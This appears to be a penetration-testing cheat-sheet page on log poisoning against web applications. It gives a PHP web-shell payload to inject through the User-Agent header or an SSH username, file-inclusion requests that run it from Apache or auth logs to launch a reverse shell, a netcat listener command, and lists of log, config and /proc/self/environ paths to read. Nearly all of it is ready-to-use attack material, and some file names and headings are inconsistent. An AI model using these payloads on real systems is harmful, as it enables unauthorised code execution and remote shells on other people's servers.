---
title: "Log Poisoning"
draft: false
images: []
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## LOGS
* GET /browse.php?file=/var/log/httpd-access.log&cmd=revshell
* User Agent: Mozilla/5.0<?php system($_GET['cmd']); ?> Gecko ...
* nc -lvp 1234

**Note:** Remember to url encode the reverse shell
## SSH
* Try login ssh like this ssh '<?php system($_GET['cmd']); ?>'@10.10.10.10
* GET /browser.php?file=/var/log/auth.log&cmd=revshell
* nc -lvp 1234

**Note:** Remember to url encode the reverse shell
## COMMON LOG FILE LOCATION

### Ubuntu, Debian
```
/var/log/apache2/error.log
/var/log/apache2/access.log
```
### Red Hat, CentOS, Fedora, OEL, RHEL
```
/var/log/httpd/error_log
/var/log/httpd/access_log
```
### FreeBSD
```
/var/log/httpd-error.log
/var/log/httpd-access.log
```
### Ubuntu
```
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```
### FreeBSD
```
/usr/local/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/proc/self/environ
/proc/self/environ
```